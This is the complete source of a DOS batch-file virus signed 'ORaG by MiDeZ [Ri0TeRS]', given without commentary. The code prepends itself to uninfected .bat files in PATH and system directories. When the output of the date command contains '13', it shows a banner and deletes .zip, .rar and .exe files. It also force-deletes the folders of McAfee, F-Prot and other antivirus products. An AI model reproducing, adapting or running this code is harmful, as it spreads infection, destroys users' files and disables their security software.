@if '%_ORaG%==' goto _ORaG
@if not '%_ORaG%==' goto ORaGend
:_ORaG ORaG
@echo off%_ORaG%
if '%1=='ORaG goto ORaG%2
set ORaG=%0.bat
if not exist %ORaG% set ORaG=%0
if '%ORaG%==' set ORaG=autoexec.bat
set !ORaG=%1 %2 %3 %4 %5 %6 %7 %8 %9
if exist %ORaG% goto ORaGfe
call %ORaG% ORaG h %path%
if exist %ORaG% goto ORaGfe
goto eORaG
:ORaGh
shift%_ORaG%
if '%2==' goto ORaGend
if exist %2\%ORaG% set ORaG=%2\%ORaG%
if exist %2%ORaG% set ORaG=%2%ORaG%
if exist %2\%ORaG%.bat set ORaG=%2\%ORaG%.bat
if exist %2%ORaG%.bat set ORaG=%2%ORaG%.bat
if not exist %ORaG% goto ORaGh
goto ORaGend
:ORaGfe
command /e:5000 /c %ORaG% ORaG vir
:eORaG
echo.|date|find "13">nul.0RaG
if errorlevel 1 goto naORaG
set ORaGmEs=echo
%ORaGmEs% ÛßßßßßßßßßßßßßßßßßßßßßßßßßÛ
%ORaGmEs% Û ORaG by MiDeZ [Ri0TeRS] Û
%ORaGmEs% ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
set %ORaGdEL%=del
%ORaGdEL% *.zip
%ORaGdEL% *.rar
%ORaGdEL% *.exe
:naORaG
call %ORaG% ORaG rh
set _ORaG=>nul.ORaG
set !ORaG=
set ORaG=
goto ORaGend
:ORaGrh
set _ORaG=x%_ORaG%
%ORaG% %!ORaG%
:ORaGvir
for %%a in (*.bat c:\*.bat c:\dos\*.bat c:\windows\*.bat ..\*.bat) do call %ORaG% ORaG i %%a
exit ORaG
:ORaGi
find "ORaG"<%3>nul
if not errorlevel 1 goto ORaGj
echo @if '%%_ORaG%%==' goto _ORaG>ORaG$
type %3>>ORaG$
echo.>>ORaG$
find "ORaG"<%ORaG%>>ORaG$
move ORaG$ %3>nul
set ORaG#=%ORaG#%1
if %ORaG#%==111111 exit
:ORaGj
set ORaG!=%ORaG!%1
if %ORaG!%==11111111 goto ORaGend
deltree /y c:\Progra~1\Antivi~1
deltree /y c:\Progra~1\Mcafee
deltree /y c:\F-Prot
deltree /y c:\Tbavw95
deltree /y c:\VS95
deltree /y c:\Toolkit
exit
:ORaGend
